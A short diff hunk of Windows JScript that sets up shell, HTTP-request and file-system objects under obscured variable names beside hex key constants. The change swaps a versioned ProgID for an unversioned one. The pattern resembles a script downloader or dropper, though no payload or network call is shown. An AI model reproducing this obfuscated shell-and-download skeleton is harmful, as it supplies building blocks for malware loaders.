@@ -20,7 +20,7 @@
     var k1 = 0x33, k2 = 0x55, k3 = 0x7A;
 
     var _v1 = new ActiveXObject("WScript.Shell");
-    var _v2 = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
+    var _v2 = new ActiveXObject("MSXML2.ServerXMLHTTP");
     var _v3 = new ActiveXObject("Scripting.FileSystemObject");
 
     // Initialize paths
